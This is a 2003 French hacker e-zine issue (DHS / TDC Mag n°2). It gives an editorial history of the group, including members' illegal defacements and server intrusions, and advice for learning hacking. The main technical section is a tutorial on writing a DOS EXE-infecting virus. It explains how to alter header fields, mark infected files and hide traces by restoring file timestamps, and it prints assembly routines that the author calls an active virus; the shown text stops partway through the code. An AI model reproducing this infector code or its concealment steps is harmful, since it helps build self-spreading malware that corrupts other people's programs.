<HTML>
<HEAD>
<STYLE>INPUT {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
.text {
	FONT-WEIGHT: normal; FONT-SIZE: 11px; COLOR: #a9bfc7; FONT-FAMILY: verdana
}
TEXTAREA {
	BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid; FONT-WEIGHT: normal; FONT-SIZE: 11px; BORDER-LEFT: #000000 1px solid; COLOR: #000000; BORDER-BOTTOM: #000000 1px solid; FONT-FAMILY: verdana; BACKGROUND-COLOR: #FFFFFF
}
A:link {
	COLOR: #a9bfc7; TEXT-DECORATION: none
}
A:hover {
	COLOR: #e9ffff; TEXT-DECORATION: none
}
A:visited {
	TEXT-DECORATION: none
}
</STYLE>
<TITLE>TDC Mag N&deg;1</TITLE> <META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1"> 
</HEAD>

<BODY BGCOLOR="#43575f" TEXT="#CCCCCC" LINK="#a9bfc7" VLINK="#a9bfc7" ALINK="#a9bfc7">
<DIV ALIGN="CENTER"><P><A HREF="http://dealerhacksecurity.free.fr"><IMG SRC="TDC%20files/DHS-bannier.gif" WIDTH="522" HEIGHT="91" BORDER="0"></A></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>DHS
  - Dealer Hack Security</b></font></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">************************************************************* 
<BR>\\\\\\\\\\\\\\\\\\\\\\\\ooooooooo:::::<FONT COLOR="#FF0000">DHS</FONT><FONT COLOR="#FF0000">
  - TDC Mag' N&deg;2</FONT>:::::<FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">ooooo</FONT>oooo//////////////////////</FONT></P></DIV><P ALIGN="CENTER"><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">Ecrit 
le 02/05/2003 </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">//
NUMERO SPECIAL // notre site : </FONT><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> <A HREF="http://dealerhacksecurity.free.fr/forum/index.php" TARGET="_blank">http://dealerhacksecurity.free.fr</A></FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">EDIT&Ocirc;T 
: </FONT></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><b>&nbsp;
C</b>e numéro est spécial. Il n'a failli ne jamais sortir et TDC Mag n°1 a manqué de justesse de
devenir l'unique opus du e-zine le plus court au monde (et le plus nul...). Ce deuxième opus est donc spécial.<br>
Il marque le début d'une nouvelle ère pour notre Team, qui se trouve totalement modifié. L'édito est réduit, mais l'introduction très longue. Mais ne vous inquiétez, pas, ce numéro est très long. Il a été travaillé et retravaillé maints et maints fois, et possède des articles de divers participants.<br>
   Avant tout, merci d'être là, de nous lire. Le premier numéro a été un succès et, a été télécharger près de 300 fois... Afin de mieux répondre à vos attentes, nous avons monter la section DEFI, permettant d'apprendre de manière ludique. En outre, nous nous acharnons à mettre en place une solide database afin de rendre ce site attrayante, utile et qui puisse servir la communauté underground entière.<br>
   En attendant, lisez vite l'introduction de ce mag et toute la suite. Plus d'inquiétude, notre Team DHS ne disparaîtra pas de sitôt. J'espère que ce numéro vous apprendra des choses d'utiles.<br>
   Des événements ont ébranlé notre Team, et d'autres sont attendus pour cette année. C'est un dur passage pour notre Team. En tout cas, nous sommes toujours là et serons là le plus tard possible. Notre volonté est
incassable. L'essentiel est que nous bâtissons tous ensemble un lieu de connaissances solide et édifiantes pour tout le monde afin de contribuer à la sécurité de notre chère Toile. N'oubliez pas : le TDC est peut être temporairement
dissoute, mais nous on sera toujours là ;)<br>
<br>
   Nous n'avons pas oublié le projet de créer une mailing-list, ainsi que de passer sur un serveur dédié (ce qui sera fait d'ici quelques semaines). Mais, même si le TDC est mort, les magazines resteront toujours les TDC Mag, en souvenir de notre
ex-Team.&nbsp;<br>
</font></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Have fun with yours Magazine,<br>
</font></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
DHS Team - Dealer-Hack Security Team<br>
<br>
*</font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">*************************<B><FONT COLOR="#CCCCCC">Contacts</FONT></B>************************** 
<BR>Fondateur / Webmaster&nbsp; : <FONT COLOR="#FF0000">A-bone</FONT> =&gt; <A HREF="mailto:alex.bone@caramail.com">alex.bone@caramail.com</A> 
<BR>Réalisateur / Concepteur&nbsp; : <FONT COLOR="#FF0000">Nocte</FONT> =&gt; <A HREF="mailto:se7en-up@caramail.com">slickers@caramail.com</A> 
<BR>Co-Admin du site&nbsp; : <FONT COLOR="#FF0000">deepfear</FONT> =&gt; <A HREF="mailto:alex.bone@caramail.com">cyberwolf4@caramail.com</A> 
<BR>***********************************************************</FONT></P><P>		PARTICIPATION / COLLABORATION<br>
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>
- Si vous avez envie de participer à notre magazine, contacter Nocte<br>
- Si vous avez envie de faire partie de notre Team, contactez Nocte &amp; A-bone.<br>
- Si vous avez envie de participer aux Défis et/ou site, contactez deepfear.<br>
</P><P>&nbsp;</P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR>SOMMAIRE <BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
</FONT></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2">1. INTRODUCTION :
NEWS... - DHS Team<br>
2. SECURITE : CRYPTOLOGIE / CHIFFREMENT - Nocte<br>
3. VIRUS : INFECTION DE FICHIER EXE - Nocte<br>
4. HACKING :&nbsp; LES SHELLCODES / OBTENTION DES DROITS DE ROOT- Nocte<br>
5. FAILLE part 1: PRINCIPES DES STACKS OVERFLOWS&nbsp; - Nocte<br>
6. FAILLE part 2: ADVISORY "CSS VULNARABILITIES ON MILITARY SITES" - Nocte<br>
7. OUTRO</font></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"> <BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR>///////////////////////////////////////////////////////////////////////////////////////////////// 
<BR>///////////////////////////////////////////////////////////////////////////////////////////////// </FONT></P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>1. INTRODUCTION <BR>===================================================================== 
</FONT></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Suite
à de gros problèmes de notre Team, se numéro se trouve très réduit.
Explication immédiates.</font></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2">Parlons
du site. Vous retrouverez des news toutes fraîches sur notre forum, et les plus chaudes sur la page
d'accueil du site du forum http://dealerhacksecurity.free.fr, remis à jour quotidiennement.
Après le crash du forum celui-ci est très bien reparti, grâce à vous ;)
Merci !<br>
<br>
   Cette introduction va être particulièrement longue. Comme TDC Mag n°1 date de février, nous allons récpituler tous les événement qui se sont produit depuis la mise en ligne du site, le 29 janvier 2003.&nbsp;<br>
   Quelque jour après la mise en ligne du TDC Mag n°1, le forum a été réinstallé le 11 février en repartant complètement à zéro, le 11 février, car son ancienne structure ne convenait à notre objectif (trop ressemblant à notre forum du DH). A-bone, le webmaster, a donc réinstallé une autre version du phpbb du forum, suite à un torp grand nombre de bug persistant notée sur la dernière verison du forum phpbb. Dans le même temps, Nocte a conçu la section Défi où, chaque semaine, est proposée un problème sous forme de défi, avec une orientation sécurité, cela afin d'améliorer ses connaissances personnelles.<br>
   Malheureusement, notre ex-site officiel, http://dealerhack-ifrance.com, a été kiké pendant près d'une semaine. Finalement, après nos demande insistantes d'explications, ifrance a finalement réouvert le compte avec, pour toute explication, le fait que certains serveurs de ifrance avait subi des problèmes technique (sic!).<br>
  L'un des coups le plus dur se produisit le vendredi 21 février, quand notre forum DHS Online fut victime d'une attaque du style [CENSURE]alert:bidon[/CENSURE]. Le forum était alors à son apogée est avait eu une croissance de visiteurs phénoménales en quelques jours (80 nouveaux inscrit en 10 jours). Cette attaque a crashé le serveur. Une seconde attaque par SQL injection a provoqué une défaillance dans la page phpmyadmin ce qui aura pour but de détruire la base de donnée du forum, base déjà bien avancée (85 membres et plus de 300 messages en 10 jours pile). Pendant 3 heures, de 22 heures à minuit, la totalité de la base de données du forum était accessible par n'importe qui sur le Net, avec une simple url...<br>
  Sans se démonter du tout, le lendemain, A-bone reprend la construction du forum.<br>
<br>
  Nous allions sortir TDC Mag n°2 quand un incident à totalement bouleversé l'avenir de
notre Team. A-bone, enfreignant les règles du DHS, a effectué des defacage sur des sites perso du FAI de Free. Oubliant de supprimer les logs, il s'est fait remonté et, quelques jours plus tard, les forces de l'ordre débarquent chez lui accompagné d'agent du FAI. Fort heureusement pour lui, ses
proches ont calmé les calmé les choses... il a frôlé la prison... Par cet acte
irrespectueux envers notre éthique et immoral, A-bone est éjecté de la Team. Le jour suivant, Stigmata roote un box et frôle lui aussi la catastrophe : il détruit les logs au moment même ou l'admin, en même temps sur
le réseau, les consulte. Par chance, Stigmata éjecte l'admin et s'en sort
d'extrême justesse. C'est le coup d'épée final : notre Team, le TDC, est
dissoute et tous les membres l'abandonne immédiatement. Stigmata quitte la
scène. Nocte récupère le site, et fonde, avec A-bone, la DHS Team : Dealer
Hack Security Team, mais A-bone n'en est plus l'admin. Il quitte la scène en se
promettant de revenir : à l'heure actuelle, il n'est toujours pas là.</font></P><P><font face="Verdana, Arial, Helvetica, sans-serif" size="2">&nbsp;&nbsp;
Le site </font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><A HREF="http://dealerhacksecurity.free.fr/forum/index.php" TARGET="_blank">http://dealerhacksecurity.free.fr</A></FONT><font face="Verdana, Arial, Helvetica, sans-serif" size="2"><A HREF="http://dealerhacksecurity.free.fr/forum/index.php" TARGET="_blank">
</A>est appelé à devenir très connu, voire une référence, en matière de sécurité.&nbsp;
A partir de là, la DHS remonte lentement la pente. Une équipe solide de modérateurs compétents se forment. Passé un moment, Daniel
San, deviendra admin de la DHS Team. Cependant, au bout de quelques jours, il l'abandonnera, afin de créer sa propre Team... souhaitons lui bonne chance ;)<br>
&nbsp;&nbsp; L'équipe trouvent des failles intéressantes, le site est actualisé chaque jour, de news exclusives et inédites (contacts spécialisés...). Dans cette optique, Nocte lance une recherche d'affiliation et de partenariat.
Ainsi, des sites très connus comme : Echu.org, Doxi-security.com, Secusys.com
et d'autres sont partenaires de notre sites. La liste complète est disponible
sur le forum de notre site. En outre, DHS est entretenu et mis à jours très
régulièrement, rajoutant une grande valeur au site.  Nocte est, à l'heure actuelle, sur un projet d'association en collaboration avec Emmanuel JUD, administrateur de secuser.com... mais vous aurez toutes les
explications dans le prochain TDC Mag ;)<br>
&nbsp;<br>
&nbsp;&nbsp; Plusieurs projets se profilent à l'horizon de la DHS Team, afin de la rendre plus célèbre est d'augmenter sa réputation. Nocte a publié, récemment (le 4 avril 2003), un advisory sur des failles CSS sur les sites militaires américains (cf. http://www.security-corporation.com). Cet advisory a été repris par echu.org, et tout cela a contribué a faire connaître notre site.<br>
<br>
<br>
  Pour cette introduction traitant du bouleversement de notre Team, nous avons tenu à retranscrire un conseil que nous a laissé un vieil ami et qui devrait résumé votre état d'esprit dès que vos lirez ces lignes
(les fautes sont d'origines :p) :<br>
"<br>
Bien, avant tout il faut savoir qu'il est très difficile, meme après avoir pratiqué le hacking durant un certain temps, de tout savoir sur tout. Il existe tellement de spécificité...&nbsp;<br>
Ca ne veux pas dire qu'il ne faut pas s'interresse a tous les domaines, car cela forme un tout, mais il vaux serait sans doute bon que tu travaille dans un team, ou vous soyez complémentaire, ou chacun se spécialisent dans des domaines particuliers. Cela vous permettra d'une part de pouvoir ensemble être capable de pouvoir être capable de travailler sur pas mal de domaine, et surtout d'autre part, une fois que l'un d'entre vous s'est vraiment bien impliqué sur un sujet, de faire partager ses connaissances aux autres membres de la team: Au final, c'est chacun qui pourra progresser réellement plus vite dans tous les domaines. Pour te donner un exemple, dans ma team pour l'instant nous sommes trois, moi spécialisé dans les failles applicatives, le réseau... Le deuxième surtout orienté vulnérabilités web, windows et wardriving, et enfin le dernier qui fais surtout du bas niveau kernel linux &amp; windows, lkm, shellcodes...&nbsp;<br>
<br>
Il y a cependant des bases élémentaires à connaitre. Tout le monde dit qu'il faut utiliser linux ... En fait ce qu'il faut comprendre, c'est que je considère un peu le hack comme un art, mais pour le pratiquer, il faut connaitre le support. Tu t'appercevras rapidement, surtout sous nux par exemple qu'il y a des failles qui tombent à longueur de temps, mais souvent sur des appli que tu ne connais pas, qui utilisent certains fichiers de configuration standard ... Tout ca tu dois le maitriser. Bref, tu te doit de maitrîser a fond le plus d'OS possible (windows, linux et UNIX), et quand je dis maîtrise, c'est connaitre sur le bout des doigts le fonctionnement, le kernel, comment il gère la stack, comment on joue avec la base de registre sous win, comment on utilise le shell... Je connais quelques hackeurs, qui ont un très bon niveaux, et qui pourtant seraient incappable de se faire une quelquonques box windows, simplement parce que celui ci ne les interresse pas, donc il ne le maitrise pas...&nbsp;<br>
Il est aussi essentiel de savoir programmer, déjà en C. Pourquoi le C, d'abord parce que c'est un language puissant, avec lequel tu peux directemet intervenir sur la stack,&nbsp;<br>
le kernel... Et aussi parceque plus de la moitié des programmes sont écrits dans ce language, ou en C++, mais si tu connais le C, tu comprendra le C++. Il faudra tot ou tard passer par l'assembleur, qui est differant sur chaque plateforme, mais ce n'est pas la premiere urgence. Enfin, plus tu connaitra de language plus tu pourra auditer de code, mais pour ca ne t'en fait pas. Meme moi qui ne me considere pas encore comme une 31337 j'apprend un language en deux jours.&nbsp;<br>
Bref, comprend simplement que pour s'attaquer a quelquechose (je parle autant d'un systeme, que de l'audit d'un code), il faut comprendre son fonctionnement, son code ...&nbsp;<br>
   Ou aprendre? Franchement un unique endroit : le web. Les livres sont très bien pour apprendre à maitriser un OS, un language de prog... Mais quand on parle de hack, le net et c'est tout. Le site de ouah, c'est sur celui là qu'il existe le plus de doc dignes de ce nom&nbsp;<br>
Madchat, qui possède quand même une bonne database securiteam.org&nbsp;<br>
Enfin, il faut que ca devinne une habitude, chaque fois que tu vois ou entend parler d'une nouvelle technique, tu vas sur google, tu la recherche, et tu te tapes toutes les papiers&nbsp;<br>
qui ont été écrits sur le sujet, jusqu'à  ce que tu est compris(si tu a le niveau a ce moment la bien sur). Ensuite, tu garde les docs qui te semblent les meilleurs, et tu les&nbsp;<br>
colles dans ta database perso, que tu partage avec les autres membres de ta team, comme ca ils n'auront pas à se retaper toute le recherche. (Bien sur ils doivent faire pareil).&nbsp;<br>
Dernière chose, les listes de diffusion, c'est surement là que j'ai appris le plus de chose. Il ne faut pas juste y voir une diffusion d'exploit. C'est surtout là que sont énumérés les nouvelles techniques... qui donnent un point de départ au recherche sur le web.&nbsp;<br>
     Ah oui dernier point sur la team, les affinités entre membres sont importants bien sur, mais si un gars est un boulet, tu le laches direct. C'est bien d'avoir un pote, mais&nbsp;<br>
si tu veux vraiment être bon dans ce domaine, reste avec des gens qui ont du potentiel, pas avec des gars qui ne chercheront pas à toujours approndir leurs connaissances, ce genre de gars vont vous ralentir. Bref, s'ils ne bossent pas assez, ou qu'il est décidément trop con pour un jour apprendre quelque chose, sans pitié.&nbsp;<br>
(c'est dur, mais c'est la scène qui est comme ca, qui tu veux t'y inteégrer tu l'accepte ou c'est toi qui te fera jeter).&nbsp;<br>
  Bon j'espère que ca te sera utile pour le futur.&nbsp;<br>
"<br>
<br>
  Voilà pour la leçon de morale. Sur ce, pardonnez-nous pour le retard, continuez à en apprendre
davantage. Nous allons refondre le site afin de former une solide database de docs...
une fois, bien sûr, que notre Team, se sera reconsolidée. En attendant, bonne lecture ;)<br>
<br>
<br>
<br>
==================================================================== 
<BR>2 . SECURITE : CRYPTOLOGIE / CHIFFREMENT - Nocte</font><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> <BR>=====================================================================</font></P><P>&nbsp;</P><P><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2">===================================================================== 
<BR>3 . </FONT><font face="Verdana, Arial, Helvetica, sans-serif" size="2"> VIRUS : INFECTION DE FICHIER EXE - Nocte</font><FONT FACE="Verdana, Arial, Helvetica, sans-serif" SIZE="2"><BR>=====================================================================</FONT></P><P ALIGN=LEFT><FONT FACE="Arial, Helvetica, sans-serif" SIZE="2">En toute logique, j'aurais du écrire un article sur les infecteurs de fichiers COM avant (car les fichiers EXE ont une structure beaucoup plus complexe). Or, par un problème indépendant de ma volonté, certains informations ne me sont pas parvenues. Par conséquent, cet article étant achevé, le voici ;)<br>
Le format exe, qui est la référence de l'éxécutable sous des système de type windows, beaucoup plus volumieux, doté d'une structure alors plus complexe, lui assure ainsi une plate-forme sûre d'expansion. L'arrivée des macros-virus a fait naitre une incompréhension totale de la manière d'infecter un .exe, en effet, ceux-ci, s'ils ne suppriment pas barabarement les éxécutables, remplace la totalité du code de ces derniers et les renomment en .vbs, ce qui n'a rien d'un procédé d'expansion virale en soit. L'injection d'un virus à travers un .exe se présente comme l'infection la plus difficile à mettre en oeuvre en raison de l'header située en tête de ce type de fichier.<br>
<br>
<br>
<br>
    I. Description :<br>
--------------------<br>
<br>
Contrairement à l'infection d'un .com, nous n'allons pas overwritter certaines données du .exe, juste modifier provisoirement certaines informations de l'header en début de fichier et modifier le tableau de réadressage. Cet en-tête est vital au fichier, altéré, il corromperait le fichier ! Il contient tout une série de paramètres nécéssaires à la&nbsp;<br>
bonne lecture de l'exécutable par le DOS : ou placer la pile, ou l'exécution commence-t'elle, la taille du fichier... Pour comprendre ceci, il est indispensable de savoir que tout .exe est organisé en segments, ainsi le code de l'éxécutable peut commencer et finir n'importe ou. Les EXE ont une entête au format PE. Voici sa description technique.<br>
<br>
<br>
[ PE Header ]<br>
<br>
    +----------------------------------------------------------------------------------------+<br>
    |OFFSET|          NOM          |TAILLE|                   DESCRIPTION                    |<br>
    +----------------------------------------------------------------------------------------+<br>
    |00    | Signature             |2bytes| MZ - 4DH 5AH                                     |<br>
    +----------------------------------------------------------------------------------------+&nbsp;<br>
    |02    | Taille dernière page  |word  | Taille en bytes de la dernière page (512 bytes)  |<br>
    +----------------------------------------------------------------------------------------+<br>
    |04    | Nombre pages fichier  |word  | Nombre total de pages de 512 bytes               |<br>
    +----------------------------------------------------------------------------------------+<br>
    |06    | Relocation items      |word  | Nombre d'entrées dans la table de relocations    |<br>
    +----------------------------------------------------------------------------------------+<br>
    |08    | Paragraphes en-tête   |word  | Taille de l'header en paragraphes (16 bytes)     |<br>
    +----------------------------------------------------------------------------------------+<br>
    |0A    | Allocation minimale   |word  | Mémoire minimum requise en paragraphes           |<br>
    +----------------------------------------------------------------------------------------+<br>
    |0C    | Allocation maximale   |word  | Mémoire maximum requise en paragraphes           |<br>
    +----------------------------------------------------------------------------------------+<br>
    |0E    | Prerelocation SS      |word  | Offset segment de pile en paragraphes            |<br>
    +----------------------------------------------------------------------------------------+<br>
    |10    | Stack pointer initial |word  | Première valeur du pointeur de la pile           |<br>
    +----------------------------------------------------------------------------------------+<br>
    |12    | Negative checksum     |word  | Nous y placerons notre marqueur d'infection      |<br>
    +----------------------------------------------------------------------------------------+<br>
    |14    | Prerelocation IP      |word  | Adresse de début d'éxécution (IP)                |<br>
    +----------------------------------------------------------------------------------------+<br>
    |16    | Prerelocation CS      |word  | Code Segment (segment de début d'éxécution)      |<br>
    +----------------------------------------------------------------------------------------+<br>
    |18    | offset table reloc.   |word  | Offset table des relocations                     |<br>
    +----------------------------------------------------------------------------------------+<br>
    |1A    | Overlay number        |word  | overlay                                          |<br>
    +----------------------------------------------------------------------------------------+<br>
    |1C    | Réservé               |dword | /                                                |<br>
    +----------------------------------------------------------------------------------------+&nbsp;<br>
<br>
<br>
Lorsque nous infections un .com, nous nous contentions de rajouter un jmp au début du fichier prenant en argument l'offset de notre virus situé à la fin du fichier. Nous overwrittions donc les premiers bytes du fichier. Ici, nous allons modifier certains champs de l'header de façon à éxécuter notre code situé dans un module chargée en mémoire (le dernier segment de l'exe), puis redonner la main au fichier hôte en remodifiant l'header. Pour cela nous aurons besoin de 5 champs. Les deux premiers nous renseigne sur la taille de la dernière page (offset 02h) et le nombre total de pages (offset 04h), donc la taille du fichier en pages de 512 de bytes. Nous modifierons aussi l'offset 0Eh contenant le déplacement en paragraphes relatif à la fin de l'header à effectuer pour atteindre le stack segment, et l'offset 10h contenant le déplacement à effectuer relativement au début de SS pour atteindre SP. Ainsi que l'offset 16h, contenant le déplacement en paragraphes relativement à la fin de l'header qu'il faut effectuer pour se rendre à l'entry point (fonction main), située sur le segment de code, première fonction a être éxécutée, nous y placerons l'offset de notre virus. Et enfin l'offset 14h, contenant l'adresse du point d'entrée (fonction main) sur CS.<br>
<br>
<br>
[ PSP ]<br>
<br>
Il faut savoir qu'après l'header de l'exécutable se trouve la table de relocation qui n'est utilisé qu'avec des fichiers dont la taille est supérieur à 64k. La table de relocation contient une liste pointeurs pointant chacun sur une adresse du programme devant être reajustées en fonction du segment dans lequel le DOS a initialisé le programme. Pour obtenir l'adresse décalée, le DOS commence par charger l'adresse située dans la table et y ajoute le segment du programme. Quand DOS lance un .exe, il charge le segment PSP dans un segment mémoire. il crée une petite structure de données de 256 octets, nommée PSP (Program Segment Prefix). Le PSP qui est un vestige des premières versions DOS et de CP/M contient des informations spécifiques à l'environnement du programme. Le PSP est créée lors de l'éxécution du programme, et ne nécéssite ainsi aucune place sur la mémoire morte du dur. Le PSP chargé, il ajoute la valeur 10h à CS et laisse ES et DS pointer sur le segment PSP. Le code initial du programme commence alors à cs:0000 ou le segment PSP est définie à CS-10h:0000 (voir schéma).<br>
<br>
<br>
<br>
                Structure .com                                 Structure .exe<br>
<br>
                +-------------+                                +-------------+&nbsp;<br>
                |             |                                |             |&nbsp;<br>
                |             |                                |             |&nbsp;<br>
                +-------------+ CS:FFFFh                    |  +-------------+&nbsp;<br>
             |  |             |                         64k |  |             |&nbsp;<br>
             |  |    PILE     |                         max |  |    PILE     |&nbsp;<br>
          64k|  |             |                             |  |             |&nbsp;<br>
          max|  +-------------+                             |_ +-------------+ SS:0000h&nbsp;<br>
             |  |             |                             |  |             |&nbsp;<br>
             |  |   DONNEES   |                         64k |  |   DONNEES   |&nbsp;<br>
             |  |             |                         max |  |             |&nbsp;<br>
             |  +-------------+                             |_ +-------------+ DS:0000h&nbsp;<br>
             |  |             |                             |  |             |&nbsp;<br>
             |  |             |                         64k |  |             |&nbsp;<br>
             |  |    CODE     |                         max |  |    CODE     |&nbsp;<br>
             |  |             |                             |  |             |&nbsp;<br>
             |  |             |                             |  |             |&nbsp;<br>
             |  |             |                             |  |             |&nbsp;<br>
 DS=SS=0000h |_ +-------------+ CS:0000h                    |_ +-------------+ CS:0000h<br>
                |    PSP      |                                |     PSP     |&nbsp;<br>
                &lt;-------------&lt; DS=SS=0000h                    &lt;-------------&lt; CS-10h:0000<br>
                |             |                                |             |&nbsp;<br>
                |             |                                |             |&nbsp;<br>
                +-------------+ 0000:0000                      +-------------+ 0000:0000&nbsp;<br>
<br>
<br>
Ceci ne sera pris en compte lors de l'infection de l'exe, mais il peut être toujours intéréssant de le savoir. Lorsqu'un programme est chargé, DOS alloue en mémoire une autre autre structure de données appelée le bloc d'environnement. Ce bloc contient la liste de toutes les variables d'environnement (qui sont généralement déclarées dans le fichier AUTOEXEC.BAT, servant à définir le contexte dans lequel l'éxécution du programme a lieu) au format VARIABLE=VALEUR\0.&nbsp;<br>
   A la fin de cette liste se trouve un byte à 0, suivi d'un mot (généralement 0001h) et finalement du nom complet de l'exécutable terminé par un \0 (byte 00h). Ce bloc d'environnement est toujours calé sur le début d'un segment, et on peut trouver l'adresse de ce segment à l'offset 02Ch du PSP. Lorsque le programme est terminé, ce bloc d'environement est détruit (i.e. déalloué).<br>
<br>
<br>
[ Processus d'infection ]<br>
<br>
Etudions dés à présent le fonctionnement général et théorique de notre infection. Vous savez qu'il differera de celle d'un .com, en raison de la structure interne de notre .exe. Tout d'abord nours allons vérifier qu'il s'agit bien d'un fichier .exe en vérifiant sa signature située à l'offset 00 de l'header qui doit correspondre à 'MZ'(ou 'ZM'). L'étape&nbsp;<br>
suivante consistera à déterminer si ce même fichier a déjà été infecté par vérification de l'offset 12 (Negative checksum) qui n'est généralement pas utilisé et donc parfait pour insérer une marque d'infection (un charactère quelconque). Notez que nous aurions aussi pu stocker ce marqueur dans SP. Ensuite il va nous falloir garder en mémoire les adresses des&nbsp;<br>
principaux registres de l'header tels que CS, SS, SP, IP. Puis nous injecterons le code virale à la fin du fichier hôte et nous définirions une adresse pour le pointeur de pile sur le segment de pile (SS:SP), une adresse fiable assure une infection réussie, dans le cas contraire, un pseudo buffer overflow planterait le programme et le virus ne pourrait&nbsp;<br>
se répandre en dehors du launcher (tous les programmes hôtes serait corrompus et ne pourraient donc fonctionner). Nous recalculerons la taille du fichier en pages et en bytes que nous devrons placer respectivement à l'offset 04 et 02 de l'header. Et enfin, nous n'aurons plus qu'à rendre la main au programme hôte en replaçant la pile à sa valeur&nbsp;<br>
initiale, le pointeur d'instruction sur CS pointant au début du fichier. Notez que nous devons reajuster SS et CS en leur ajoutant ES+10 (ES et DS pointent tous deux sur PSP). L'ultime étape consiste à masquer toute trace d'infection en restorant les attributs de fichier et la dernière date (et heure) de modification du fichier pour éviter de pouvoir tracer le virus.&nbsp;<br>
<br>
<br>
<br>
    II. Programmation :<br>
-----------------------------<br>
<br>
<br>
Après toute cette théorie vous devez être capable de coder un launcher facilement. Nous allons étudier successivement toutes les routines d'infection assembleur. Rien de bien compliqué je vous rassure. Le code a été obtenue par modification de mon virus zex, les routines de début sont donc identiques et la structure du programme s'est vue compliqué par&nbsp;<br>
l'infection du format exe. Ce virus est actif, de ce fait essayer de l'isoler sur votre machine. Tout d'abord, il nous faut calculer le décalage relatif à la fin du fichier hôte infecté, pour ensuite pouvoir manipuler variables et label à partir du fichier infecté.&nbsp;<br>
<br>
<br>
Virus:<br>
        push ds               ;empile ds&nbsp;<br>
        push cs cs            ;empile cs&nbsp;<br>
        pop  es ds            ;es = ds = cs&nbsp;<br>
        call debut&nbsp;<br>
<br>
debut:&nbsp;<br>
        pop  bp               ;on récupere ds<br>
        sub  bp,offset debut  ;on y soustrait l'offset du label&nbsp;<br>
                              ;debut: pour obtenir le début du virus<br>
<br>
<br>
<br>
<br>
Maintenant nous devons déclarer une nouvelle table DTA (cela sera expliqué dans l'article des infecteurs COM) puis mettre à 0 l'IP, pour le faire pointer ensuite sur notre code virale situé à la fin du virus. A la fin de la routine défaut nous lancerons la recherche d'exe à infecter.<br>
<br>
MDTA:<br>
        lea  dx,[bp+DTA]      ;dx &lt;- [bp+DTA]&nbsp;<br>
        mov  ah,1a            ;définir nouvelle table DTA&nbsp;<br>
        int  21&nbsp;<br>
<br>
Defaut:&nbsp;<br>
        lea  di,[bp+New_IP]   ;di &lt;- [bp+New_IP] (destination)&nbsp;<br>
        lea  si,[bp+Def_IP]   ;si &lt;- [bp+Def_IP] (source)<br>
        mov  cx,4             ;cx &lt;- 4<br>
        rep  movsw            ;di[4] &lt;- si[4]&nbsp;<br>
        mov  ah,4e            ;ax &lt;- 4eh (code de recherche)<br>
        xor  cx,cx            ;cx &lt;- 0&nbsp;<br>
        lea  dx,[bp+exesig]   ;dx &lt;- [bp+exesig] (fichier que nous recherchons, ici '*.exe')<br>
<br>
<br>
Nos arguments de recherches placés dans les différents registres, nous n'avons plus qu'à lancer la boucle de recherche principale. C'est la fonction principale de notre virus, après avoir trouver un fichier en .exe, elle commence par le lire dans sa totalité en stockant son contenu dans un buffer: header_exe, ensuite elle se contente de vérifier le format&nbsp;<br>
du fichier par lecture à l'offset 00 de la chaine 'ZM' et la pureté de ce dernier par lecture de l'offset 12. Si le fichier est bien un .exe pure (i.e si l'offset 12 de l'header ne contient pas la chaine 'X'), alors elle appelle la routine SHEADER qui effectue une sauvegarde de l'header, puis les deux routines CSIP et SIZE qui, respectivement, modifie différents offsets de l'header et calcule la nouvelle taille de l'exe (concaténer avec le virus). Et enfin copie le virus à la fin du fichier et l'header modifié au début de celui-ci.<br>
<br>
<br>
Loop_cherche:<br>
        int  21                              ;lance la recherche<br>
        jc   End_loop                        ;erreur? recherche terminée? on quitte<br>
        mov  ax,3d02                         ;ax &lt;- 3d02h<br>
        lea  dx,[bp+DTA+1e]                  ;dx &lt;- [bp+DTA+1e] (offset 1eh table DTA = nom du fichier)&nbsp;<br>
        int  21                              ;on ouvre le fichier en lecture/écriture&nbsp;<br>
        mov  bx,ax                           ;bx &lt;- handle du fichier&nbsp;<br>
